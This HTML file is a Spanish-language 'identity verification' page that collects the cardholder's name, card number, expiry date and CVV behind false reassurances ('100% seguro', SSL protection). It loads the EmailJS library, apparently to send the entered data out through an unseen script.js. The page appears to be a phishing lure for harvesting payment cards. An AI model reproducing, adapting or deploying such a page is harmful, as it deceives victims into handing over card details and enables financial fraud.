<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación Segura</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="decoracion-top">🌸</div>
    <div class="container">
        <div class="header">
            <div class="icono-seguridad">🔒</div>
            <h1>Verificación de Identidad</h1>
            <p class="subtitulo">Proceso 100% seguro</p>
        </div>

        <form id="paymentForm">
            <div class="input-group">
                <label>🌷 Nombre del titular</label>
                <input type="text" id="nombre" placeholder="Ej. Ana García" required>
            </div>

            <div class="input-group">
                <label>💳 Número de tarjeta</label>
                <input type="text" id="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
            </div>

            <div class="input-group-dual">
                <div class="input-group">
                    <label>📅 Fecha de expiración</label>
                    <input type="month" id="fecha" required>
                </div>
                <div class="input-group">
                    <label>🔑 Código CVV</label>
                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <button type="submit">Verificar Identidad 🌸</button>
        </form>

        <div class="aviso-seguridad">
            <div class="candado-icon">🔐</div>
            <p>Tus datos están protegidos con encriptación SSL</p>
        </div>
    </div>
    <div class="decoracion-bottom">🌺</div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
